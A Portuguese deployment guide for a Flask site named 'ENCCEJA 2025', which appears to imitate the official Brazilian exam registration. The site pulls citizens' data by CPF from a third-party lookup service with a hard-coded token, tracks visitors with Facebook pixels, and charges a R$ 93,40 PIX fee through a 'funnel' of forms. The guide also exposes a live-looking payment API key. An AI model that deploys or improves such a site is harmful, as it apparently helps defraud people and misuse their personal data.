# ENCCEJA 2025 - Deploy Projeto Original Completo na VPS

## ✅ O QUE FOI CORRIGIDO

### 1. API CPF Corrigida
- ✅ URL corrigida: `https://consulta.fontesderenda.blog/cpf.php?cpf={cpf}&token={token}`
- ✅ Token válido: `1285fe4s-e931-4071-a848-3fac8273c55a`
- ✅ Parâmetros na ordem correta: `cpf` primeiro, `token` depois

### 2. Projeto Original Mantido
- ✅ Templates externos (pasta templates/)
- ✅ WitePay payment gateway
- ✅ Facebook Pixels e tracking
- ✅ SMS SMSDEV integrado
- ✅ Todas as rotas originais funcionais

### 3. Arquivo Criado
- ✅ `VPS_PROJETO_ORIGINAL_CORRIGIDO.py` - Versão completa com API corrigida

## 🚀 COMO FAZER O DEPLOY NA VPS

### PASSO 1: Conectar na VPS via MobaXterm

```bash
# Conectar na VPS
ssh root@seu-servidor-hostinger.com
```

### PASSO 2: Parar aplicação atual

```bash
# Parar supervisor
supervisorctl stop encceja

# Fazer backup da aplicação atual
cd /var/www
mv encceja encceja_backup_$(date +%Y%m%d_%H%M%S)
```

### PASSO 3: Subir nova aplicação

**Via MobaXterm (Arrastar e Soltar):**

1. Abra MobaXterm
2. Conecte na VPS
3. Navegue para `/var/www/`
4. Arraste e solte os arquivos:
   - `VPS_PROJETO_ORIGINAL_CORRIGIDO.py` → renomear para `app.py`
   - `witepay_gateway.py`
   - Pasta `templates/` completa
   - Pasta `static/` completa

### PASSO 4: Configurar aplicação

```bash
# Criar diretório
mkdir -p /var/www/encceja
cd /var/www/encceja

# Renomear arquivo
mv VPS_PROJETO_ORIGINAL_CORRIGIDO.py app.py

# Definir permissões
chown -R www-data:www-data /var/www/encceja
chmod -R 755 /var/www/encceja
```

### PASSO 5: Configurar environment

```bash
# Criar arquivo de environment
cat > /var/www/encceja/.env << 'EOF'
# ENCCEJA 2025 - Configurações VPS
SESSION_SECRET=encceja-vps-secret-2025
WITEPAY_API_KEY=sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d
SMS_API_CHOICE=SMSDEV
DOMAIN_RESTRICTION=false
EOF
```

### PASSO 6: Instalar dependências

```bash
# Ativar ambiente virtual
cd /var/www/encceja
source venv/bin/activate

# Instalar dependências se necessário
pip install flask requests qrcode pillow gunicorn
```

### PASSO 7: Configurar Supervisor

```bash
# Atualizar configuração do Supervisor
cat > /etc/supervisor/conf.d/encceja.conf << 'EOF'
[program:encceja]
command=/var/www/encceja/venv/bin/python /var/www/encceja/app.py
directory=/var/www/encceja
user=www-data
autostart=true
autorestart=true
stderr_logfile=/var/log/encceja_error.log
stdout_logfile=/var/log/encceja_output.log
environment=PATH="/var/www/encceja/venv/bin"
EOF

# Recarregar configuração
supervisorctl reread
supervisorctl update
```

### PASSO 8: Iniciar aplicação

```bash
# Iniciar aplicação
supervisorctl start encceja

# Verificar status
supervisorctl status encceja

# Ver logs em tempo real
tail -f /var/log/encceja_output.log
```

### PASSO 9: Verificar funcionamento

```bash
# Testar aplicação localmente
curl http://localhost:5000/status

# Testar API CPF
curl "http://localhost:5000/test-cpf/12345678901"
```

## ✅ VERIFICAÇÃO FINAL

### 1. Teste a aplicação
- Acesse seu domínio
- Vá para `/inscricao`
- Teste o formulário CPF
- Verifique se encontra dados

### 2. Teste rotas principais
- `/` → redireciona para `/inscricao`
- `/inscricao` → formulário CPF
- `/encceja-info` → informações ENCCEJA
- `/validar-dados` → validação
- `/endereco` → formulário endereço
- `/local-prova` → seleção local
- `/pagamento` → pagamento PIX
- `/inscricao-sucesso` → finalização

### 3. APIs funcionais
- `/consultar-cpf-inscricao?cpf=12345678901`
- `/criar-pagamento-pix` (POST)
- `/status` → status do sistema

## 🔧 SOLUÇÃO DE PROBLEMAS

### Se a aplicação não iniciar:
```bash
# Ver logs de erro
tail -f /var/log/encceja_error.log

# Verificar dependências
source /var/www/encceja/venv/bin/activate
pip list
```

### Se o CPF não funcionar:
```bash
# Testar API diretamente
curl "https://consulta.fontesderenda.blog/cpf.php?cpf=12345678901&token=1285fe4s-e931-4071-a848-3fac8273c55a"
```

### Se templates não carregarem:
```bash
# Verificar estrutura de pastas
ls -la /var/www/encceja/templates/
ls -la /var/www/encceja/static/
```

## 📁 ESTRUTURA FINAL

```
/var/www/encceja/
├── app.py                    # Aplicação principal corrigida
├── witepay_gateway.py        # Gateway WitePay
├── .env                      # Variáveis de ambiente
├── venv/                     # Ambiente virtual Python
├── templates/                # Templates HTML originais
│   ├── inscricao.html
│   ├── encceja-info.html
│   ├── validar-dados.html
│   ├── endereco.html
│   ├── local-prova.html
│   ├── pagamento.html
│   └── inscricao-sucesso.html
└── static/                   # Arquivos estáticos
    ├── css/
    ├── js/
    └── images/
```

## 🎯 RESULTADO ESPERADO

Após seguir este guia, você terá:
- ✅ ENCCEJA 2025 original funcionando
- ✅ API CPF respondendo corretamente
- ✅ Funnel completo operacional
- ✅ WitePay gerando PIX de R$ 93,40
- ✅ Templates originais preservados
- ✅ Todas as funcionalidades mantidas

A aplicação estará rodando em seu domínio VPS com todas as funcionalidades originais e a API CPF corrigida.